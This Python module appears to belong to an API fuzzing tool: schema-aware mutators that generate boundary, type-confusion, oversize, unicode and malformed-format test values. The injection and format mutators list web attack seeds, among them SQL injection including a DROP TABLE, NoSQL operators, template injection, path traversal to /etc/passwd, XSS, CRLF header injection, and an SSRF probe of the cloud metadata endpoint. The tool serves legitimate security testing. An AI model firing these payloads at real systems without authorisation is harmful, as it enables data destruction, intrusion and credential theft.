"""
Payload mutators — generate attack and boundary-value payloads from a JSON Schema.

Each mutator targets a specific vulnerability class:
  - BoundaryMutator     → integer/string length boundaries (off-by-one, max+1)
  - TypeConfusionMutator → wrong types, type coercion, JSON type juggling
  - InjectionMutator    → SQL, NoSQL, SSTI, path traversal, CRLF, XSS seeds
  - NullMutator         → null, undefined, empty string, zero, false, []
  - OversizeMutator     → strings/arrays exceeding declared maxLength/maxItems
  - UnicodeMutator      → RTL overrides, null bytes, homoglyphs, emoji
  - FormatMutator       → malformed UUIDs, dates, emails, URIs

The mutators are schema-aware: they read the `type`, `format`, `minimum`,
`maximum`, `minLength`, `maxLength`, and `enum` constraints from the schema
and generate payloads that target the edges of those constraints.
"""

from __future__ import annotations

import random
import string
import uuid
from abc import ABC, abstractmethod
from typing import Any


class BaseMutator(ABC):
    name: str = "base"

    @abstractmethod
    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        """Return a list of mutated values for the given schema."""
        ...


class BoundaryMutator(BaseMutator):
    """
    Integer and string boundary values.
    Most validation bugs live at min-1, min, max, max+1.
    """
    name = "boundary"

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        t = schema.get("type", "string")
        payloads = []

        if t in ("integer", "number"):
            minimum = schema.get("minimum", 0)
            maximum = schema.get("maximum", 2147483647)
            exclusive_min = schema.get("exclusiveMinimum", False)
            exclusive_max = schema.get("exclusiveMaximum", False)

            payloads.extend([
                minimum - 1,                          # below minimum
                minimum,                              # at minimum
                minimum + 1,                          # just above minimum
                maximum - 1,                          # just below maximum
                maximum,                              # at maximum
                maximum + 1,                          # above maximum
                0,                                    # zero (often special-cased)
                -1,                                   # negative one
                -2147483648,                          # INT_MIN
                2147483647,                           # INT_MAX
                9223372036854775807,                  # LONG_MAX
                1.7976931348623157e+308,              # float max
                float("inf"),                         # infinity
                float("nan"),                         # NaN
            ])

            if exclusive_min:
                payloads.append(minimum)              # exclusive boundary
            if exclusive_max:
                payloads.append(maximum)

        elif t == "string":
            min_len = schema.get("minLength", 0)
            max_len = schema.get("maxLength", 255)

            payloads.extend([
                "",                                   # empty string
                "a" * max(0, min_len - 1),            # below minLength
                "a" * min_len,                        # at minLength
                "a" * (min_len + 1),                  # just above minLength
                "a" * (max_len - 1),                  # just below maxLength
                "a" * max_len,                        # at maxLength
                "a" * (max_len + 1),                  # above maxLength
                "a" * (max_len * 10),                 # 10x maxLength
            ])

        elif t == "array":
            min_items = schema.get("minItems", 0)
            max_items = schema.get("maxItems", 100)
            payloads.extend([
                [],                                   # empty array
                [None] * max(0, min_items - 1),
                [None] * min_items,
                [None] * (max_items + 1),
                [None] * (max_items * 10),
            ])

        return payloads


class TypeConfusionMutator(BaseMutator):
    """
    Send wrong types to trigger type coercion bugs.
    JSON type juggling is a common source of auth bypasses.
    """
    name = "type_confusion"

    _ALL_TYPES = [
        None, True, False, 0, 1, -1, 0.0, 1.5,
        "", "0", "1", "true", "false", "null",
        [], [1, 2, 3], {}, {"key": "value"},
    ]

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        t = schema.get("type", "string")
        payloads = []

        if t == "string":
            payloads.extend([
                None, True, False, 0, 1, [], {},
                ["array", "where", "string", "expected"],
                {"object": "where string expected"},
            ])
        elif t in ("integer", "number"):
            payloads.extend([
                None, True, False, "0", "1", "NaN", "Infinity",
                [], {}, "not_a_number", "1e500",
            ])
        elif t == "boolean":
            payloads.extend([
                None, 0, 1, "true", "false", "1", "0",
                "yes", "no", [], {},
            ])
        elif t == "array":
            payloads.extend([
                None, "not_an_array", 0, False, {},
            ])
        elif t == "object":
            payloads.extend([
                None, "not_an_object", [], 0, False,
            ])

        return payloads


class InjectionMutator(BaseMutator):
    """
    Classic injection payloads for string fields.
    Seeds — not complete exploit payloads. The goal is to detect
    unhandled characters that leak stack traces or trigger errors.
    """
    name = "injection"

    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users;--",
        "1' UNION SELECT NULL--",
        "admin'--",
        "' OR SLEEP(1)--",
        "1; SELECT * FROM users",
    ]

    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
    ]

    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{% debug %}",
    ]

    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
    ]

    CRLF = [
        "foo\r\nX-Injected: bar",
        "foo%0d%0aX-Injected: bar",
        "\r\n\r\n<html>injected</html>",
    ]

    XSS_SEEDS = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "';alert(1)//",
    ]

    FORMAT_STRINGS = [
        "%s%s%s%s%s",
        "%x%x%x%x",
        "%n%n%n%n",
    ]

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        t = schema.get("type", "string")
        if t != "string":
            return []

        fmt = schema.get("format", "")
        payloads = []

        # Always include injection seeds for string fields
        payloads.extend(self.SQL_PAYLOADS)
        payloads.extend(self.NOSQL_PAYLOADS)
        payloads.extend(self.SSTI_PAYLOADS)
        payloads.extend(self.CRLF)
        payloads.extend(self.FORMAT_STRINGS)

        # Only add path traversal for fields likely to be file paths
        if any(kw in fmt.lower() for kw in ("path", "file", "uri", "url")):
            payloads.extend(self.PATH_TRAVERSAL)

        # Always include XSS seeds
        payloads.extend(self.XSS_SEEDS)

        return payloads


class NullMutator(BaseMutator):
    """Empty/null/zero values that often bypass validation."""
    name = "null"

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        return [
            None, "", 0, False, [], {}, "null", "undefined",
            "None", "nil", "NULL", "0", "false",
        ]


class OversizeMutator(BaseMutator):
    """Payloads larger than declared max — buffer overflows, DoS, truncation."""
    name = "oversize"

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        t = schema.get("type", "string")
        payloads = []

        if t == "string":
            max_len = schema.get("maxLength", 255)
            payloads.extend([
                "A" * (max_len + 1),
                "A" * 1000,
                "A" * 10000,
                "A" * 100000,
                "\x00" * 1000,                        # null bytes
                "A" * 65536,                          # 64KB
            ])
        elif t == "array":
            max_items = schema.get("maxItems", 100)
            payloads.extend([
                list(range(max_items + 1)),
                list(range(10000)),
            ])

        return payloads


class UnicodeMutator(BaseMutator):
    """Unicode edge cases that break parsers, comparisons, and displays."""
    name = "unicode"

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        if schema.get("type", "string") != "string":
            return []

        return [
            "\u0000",                                  # null byte
            "\uFEFF",                                  # BOM
            "\u202E normal text",                      # RTL override
            "\u0041\u0300",                            # A + combining grave (looks like À)
            "café",                                    # accented character
            "𝕳𝖊𝖑𝖑𝖔",                                # Mathematical Fraktur
            "Hello\u200BWorld",                        # zero-width space
            "\t\n\r\x0b\x0c",                         # whitespace variants
            "а" * 50,                                  # Cyrillic а (homoglyph of Latin a)
            "❌🚫⚠️💀",                               # emoji
            "\u0022\u0027\u003C\u003E",               # XML/HTML special chars as unicode
            "＜script＞",                              # fullwidth HTML
        ]


class FormatMutator(BaseMutator):
    """Malformed values for fields with format constraints."""
    name = "format"

    def mutate(self, schema: dict, original: Any = None) -> list[Any]:
        fmt = schema.get("format", "")
        payloads = []

        if fmt == "uuid":
            payloads.extend([
                "not-a-uuid",
                "00000000-0000-0000-0000-000000000000",     # nil UUID
                str(uuid.uuid4()).replace("-", ""),          # UUID without dashes
                "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",     # template
                "' OR 1=1--",                               # SQL in UUID field
                " ",
            ])
        elif fmt in ("date-time", "date"):
            payloads.extend([
                "not-a-date",
                "9999-99-99",
                "2024-13-01",                               # invalid month
                "2024-01-32",                               # invalid day
                "1970-01-01T00:00:00Z",                    # epoch
                "2038-01-19T03:14:07Z",                    # Y2K38
                "9999-12-31T23:59:59Z",                    # far future
                "0000-00-00T00:00:00Z",                    # zero date
                "-1",
                "",
            ])
        elif fmt == "email":
            payloads.extend([
                "not-an-email",
                "@nodomain",
                "no-at-sign",
                "a@b",
                "a@b.c" + "o" * 250,                      # very long TLD
                "a+b+c@example.com",
                "\"quoted\"@example.com",
                "admin@example.com\r\nBcc: evil@evil.com", # CRLF injection
            ])
        elif fmt in ("uri", "url"):
            payloads.extend([
                "not-a-url",
                "javascript:alert(1)",
                "file:///etc/passwd",
                "http://localhost/admin",
                "http://169.254.169.254/latest/meta-data/", # AWS metadata
                "http://0.0.0.0/",
                "//evil.com/path",
                "",
            ])

        return payloads


# ── Mutator registry ──────────────────────────────────────────────────────────

ALL_MUTATORS: list[BaseMutator] = [
    BoundaryMutator(),
    TypeConfusionMutator(),
    InjectionMutator(),
    NullMutator(),
    OversizeMutator(),
    UnicodeMutator(),
    FormatMutator(),
]


def generate_mutations(schema: dict, original: Any = None) -> list[tuple[str, Any]]:
    """
    Run all mutators against a schema and return (mutator_name, value) tuples.
    Deduplicates by string representation to avoid redundant requests.
    """
    seen = set()
    results = []

    for mutator in ALL_MUTATORS:
        for value in mutator.mutate(schema, original):
            key = repr(value)
            if key not in seen:
                seen.add(key)
                results.append((mutator.name, value))

    return results
